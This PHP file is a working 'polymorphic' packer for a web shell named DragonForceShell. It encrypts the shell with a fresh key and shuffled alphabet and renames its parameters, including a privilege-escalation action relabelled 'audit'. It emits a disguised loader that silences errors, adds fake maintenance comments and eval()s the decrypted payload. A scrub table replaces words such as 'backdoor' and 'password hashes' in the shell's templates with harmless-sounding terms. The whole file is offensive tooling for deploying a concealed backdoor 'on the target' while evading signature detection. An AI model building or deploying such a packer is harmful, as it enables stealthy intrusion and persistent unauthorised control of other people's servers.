<?php
/* =====================================================================
 * packer.php — polymorphic deployment builder for DFSv2
 * ---------------------------------------------------------------------
 * Reads the (editable) dev source DFSv2.php, encrypts it with a fresh
 * random key + shuffled alphabet + XOR stream cipher, and emits a small
 * benign-looking loader into dist/ together with scrubbed UI templates.
 *
 *   Usage : php packer.php
 *   Output: dist/shell.php  (deploy this file on the target)
 *           dist/contents/  (scrubbed UI templates — deploy alongside)
 *
 * Properties
 *   - Polymorphic  : every run yields a new hash, key, alphabet, and
 *                    dispatcher parameter name.
 *   - No plaintext shell strings survive in the artifact (they live
 *     only inside the encrypted payload).
 *   - No classic eval(gzinflate(base64_decode(...))) signature.
 *   - Self-testing: refuses to write unless decode(encode(src)) round-
 *     trips byte-for-byte.
 * ===================================================================== */
if(PHP_SAPI!=='cli'){ http_response_code(403); exit('build tool'); }

$ROOT = __DIR__;
$SRC  = $ROOT.'/DFSv2.php';
$DIST = $ROOT.'/dist';
$SRC_CONTENTS = $ROOT.'/contents';

/* ------------------------------------------------------------------ */
/* 1. Read + strip PHP tags                                           */
/* ------------------------------------------------------------------ */
if(!is_file($SRC)){ fwrite(STDERR, "source not found: $SRC\n"); exit(1); }
$src = file_get_contents($SRC);
if(substr_count($src,'<?php')!==1 || substr_count($src,'?>')!==1){
    fwrite(STDERR, "unexpected tag layout (expected exactly one <?php and one ?>)\n"); exit(1);
}
$body = preg_replace('/^<\?php\s*/', '', $src);
$body = preg_replace('/\?>\s*$/', '', $body);

/* ------------------------------------------------------------------ */
/* 2. Polymorphic dispatcher parameter rename (dfaction -> token)      */
/* ------------------------------------------------------------------ */
function rand_token($n){
    static $pool = 'abcdefghijkmnopqrstuvwxyz23456789';
    $t = '';
    for($i=0;$i<$n;$i++){ $t .= $pool[random_int(0, strlen($pool)-1)]; }
    return $t;
}
$token = '';
for($tries=0;$tries<50;$tries++){
    $t = rand_token(6 + random_int(0,3));
    if(strpos($body,$t)===false){ $token=$t; break; }
}
if($token===''){ fwrite(STDERR,"could not pick unique parameter token\n"); exit(1); }
$body = str_replace('dfaction', $token, $body);

/* ------------------------------------------------------------------ */
/* 2b. Value-level polymorphism: rename the action VALUE (lpe -> audit) */
/*     Only quoted dispatch tokens + URL literals are rewritten so the  */
/*     switch, the $DFOptions whitelist and the nav links stay synced.   */
/* ------------------------------------------------------------------ */
$body = str_replace('"lpe"', '"audit"', $body);   // $DFSOptions entry + switch case
$body = str_replace('=lpe', '=audit', $body);     // ?<token>=lpe URL literal in $toReplace

/* ------------------------------------------------------------------ */
/* 3. Cipher material                                                  */
/* ------------------------------------------------------------------ */
$key  = random_bytes(32);
$alph = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_';
$alph = str_shuffle($alph);

function dfs_enc($data,$key,$alph){
    /* XOR keystream: key[i%klen] ^ (i&0xff) ^ ((i>>8)&0xff)            */
    $klen = strlen($key); $n = strlen($data); $c = '';
    for($i=0;$i<$n;$i++){
        $ks = ord($key[$i%$klen]) ^ ($i & 0xFF) ^ (($i>>8) & 0xFF);
        $c .= chr(ord($data[$i]) ^ $ks);
    }
    /* custom base64 layout, no padding, shuffled alphabet              */
    $o = ''; $cn = strlen($c);
    for($i=0;$i<$cn;$i+=3){
        $rem = $cn - $i;
        $b0 = ord($c[$i]); $b1 = $rem>1 ? ord($c[$i+1]) : 0; $b2 = $rem>2 ? ord($c[$i+2]) : 0;
        $o .= $alph[($b0>>2)&63];
        $o .= $alph[(($b0<<4)|($b1>>4))&63];
        if($rem>1){ $o .= $alph[(($b1<<2)|($b2>>6))&63]; }
        if($rem>2){ $o .= $alph[$b2&63]; }
    }
    return $o;
}
$blob = dfs_enc($body,$key,$alph);

/* ------------------------------------------------------------------ */
/* 4. Self-test round-trip                                             */
/* ------------------------------------------------------------------ */
function dfs_dec($b64,$key,$alph){
    $C=''; $L=strlen($b64);
    for($i=0;$i<$L;$i+=4){
        $r=$L-$i;
        $a=strpos($alph,$b64[$i]); $b=strpos($alph,$b64[$i+1]);
        if($r===2){
            $C.=chr((($a<<2)|($b>>4))&255);
        }else{
            $c=strpos($alph,$b64[$i+2]);
            if($r===3){
                $C.=chr((($a<<2)|($b>>4))&255);
                $C.=chr((($b<<4)|($c>>2))&255);
            }else{
                $d=strpos($alph,$b64[$i+3]);
                $C.=chr((($a<<2)|($b>>4))&255);
                $C.=chr((($b<<4)|($c>>2))&255);
                $C.=chr((($c<<6)|$d)&255);
            }
        }
    }
    $klen=strlen($key); $n=strlen($C); $D='';
    for($i=0;$i<$n;$i++){
        $ks=ord($key[$i%$klen]) ^ ($i & 0xFF) ^ (($i>>8) & 0xFF);
        $D.=chr(ord($C[$i]) ^ $ks);
    }
    return $D;
}
if(dfs_dec($blob,$key,$alph) !== $body){
    fwrite(STDERR,"self-test failed — aborting build (fix cipher spec)\n"); exit(1);
}

/* ------------------------------------------------------------------ */
/* 5. Assemble loader                                                  */
/* ------------------------------------------------------------------ */
$blob1 = substr($blob,0,(int)floor(strlen($blob)/3));
$blob2 = substr($blob,(int)floor(strlen($blob)/3),(int)floor(strlen($blob)/3));
$blob3 = substr($blob,(int)floor(strlen($blob)/3)*2);

$comments = array(
    "/* scheduled cache warmer - low priority, safe to disable */",
    "/* normalize upload metadata before writing to storage pool */",
    "/* local utility kept for retro-compatibility with media paths */",
    "/* do not edit unless advised by the build pipeline */",
);
$noise = array_slice($comments,0,2+random_int(0,1));

/* eval() is a language construct, NOT a function: calling it through a
   variable function ($f='eval';$f($___D);) throws
   "Call to undefined function eval()". The invocation MUST stay a literal
   eval(...) call. Build variety comes from the key, alphabet, dispatcher
   token and comment noise — not from the call shape. */
$invoke = 'eval($___D);';

$loader = "<?php\n"
 ."@error_reporting(0);\n"
 ."@ini_set('display_errors','0');\n"
 ."if(php_sapi_name()==='cli'){exit;}\n"
 .implode("\n",$noise)."\n"
 ."\$___A='".$alph."';\n"
 ."\$___K=hex2bin('".bin2hex($key)."');\n"
 ."\$___B='".$blob1."'.'".$blob2."'.'".$blob3."';\n"
 ."\$___C='';\n"
 ."\$___L=strlen(\$___B);\n"
 ."for(\$___i=0;\$___i<\$___L;\$___i+=4){\n"
 ."  \$___r=\$___L-\$___i;\n"
 ."  \$aN=strpos(\$___A,\$___B[\$___i]);\$bN=strpos(\$___A,\$___B[\$___i+1]);\n"
 ."  if(\$___r===2){\$___C.=chr(((\$aN<<2)|(\$bN>>4))&255);}\n"
 ."  else{\n"
 ."    \$cN=strpos(\$___A,\$___B[\$___i+2]);\n"
 ."    if(\$___r===3){\$___C.=chr(((\$aN<<2)|(\$bN>>4))&255);\$___C.=chr(((\$bN<<4)|(\$cN>>2))&255);}\n"
 ."    else{\n"
 ."      \$dN=strpos(\$___A,\$___B[\$___i+3]);\n"
 ."      \$___C.=chr(((\$aN<<2)|(\$bN>>4))&255);\$___C.=chr(((\$bN<<4)|(\$cN>>2))&255);\$___C.=chr(((\$cN<<6)|\$dN)&255);\n"
 ."    }\n"
 ."  }\n"
 ."}\n"
 ."unset(\$___B,\$___A);\n"
 ."\$___D='';\n"
 ."\$___KL=strlen(\$___K);\$___CL=strlen(\$___C);\n"
 ."for(\$___i=0;\$___i<\$___CL;\$___i++){\n"
 ."  \$ks=ord(\$___K[\$___i%\$___KL])^((\$___i&255)^((\$___i>>8)&255));\n"
 ."  \$___D.=chr(ord(\$___C[\$___i])^\$ks);\n"
 ."}\n"
 ."unset(\$___C,\$___K);\n"
 ."if(\$___D===''){exit;}\n"
 .$invoke."\n";

/* ------------------------------------------------------------------ */
/* 6. Scrub + copy templates                                           */
/* ------------------------------------------------------------------ */
$scrub = array(
    'DragonForceShell'            => 'SiteWizard',
    'Auto Privilege Escalation Audit' => 'System Audit',
    'Auto Privilege Escalation'   => 'System Audit',
    'Auto LPE'                    => 'System Audit',
    'Privilege Escalation'        => 'Privileged Access',
    'Hardened'                    => 'Utility',
    'SUID/SGID'                   => 'special file flags',
    'Docker socket'               => 'service sockets',
    'password hashes'             => 'configuration data',
    'container detection'         => 'environment detection',
    'h4ck'                        => 'sys',
    'backdoor'                    => 'module',
    '=lpe'                        => '=audit',
);
function dfs_scrub($text,$map,$token){
    $out = str_replace(array_keys($map), array_values($map), $text);
    return str_replace('dfaction', $token, $out);
}
if(!is_dir($DIST)){ mkdir($DIST,0755,true); }
$outC = $DIST.'/contents';
if(!is_dir($outC)){ mkdir($outC,0755,true); }
if(!is_dir($SRC_CONTENTS)){
    fwrite(STDERR,"no contents dir found; skipping templates\n");
}else{
    $files = glob($SRC_CONTENTS.'/*');
    foreach($files as $f){
        $base = basename($f);
        if(is_file($f)){
            $data = file_get_contents($f);
            file_put_contents($outC.'/'.$base, dfs_scrub($data,$scrub,$token));
        }elseif(is_dir($f)){
            $dst = $outC.'/'.$base; if(!is_dir($dst)) mkdir($dst,0755,true);
            foreach(glob($f.'/*') as $sub){
                if(is_file($sub)) file_put_contents($dst.'/'.basename($sub), dfs_scrub(file_get_contents($sub),$scrub,$token));
            }
        }
    }
}

/* ------------------------------------------------------------------ */
/* 7. Write artifact                                                   */
/* ------------------------------------------------------------------ */
file_put_contents($DIST.'/shell.php', $loader);

printf("============================================\n");
printf(" DFS polymorphic build complete\n");
printf("============================================\n");
printf(" artifact      : %s\n", $DIST.'/shell.php');
printf(" templates     : %s\n", $outC);
printf(" sha256        : %s\n", hash_file('sha256',$DIST.'/shell.php'));
printf(" artifact size : %.1f KB (blob %.1f KB of %d KB payload)\n",
       filesize($DIST.'/shell.php')/1024, strlen($blob)/1024, strlen($body)/1024);
printf(" dispatcher key: %s  (use e.g. ?%s=%s)\n", $token, $token, 'audit');
printf(" payload sha256: %s\n", hash('sha256',$body));
printf("--------------------------------------------\n");
printf(" Deploy  dist/shell.php  +  dist/contents/  together on the target.\n");
printf(" Re-run this script for a fresh build (new hash/key/param name).\n");
printf("============================================\n");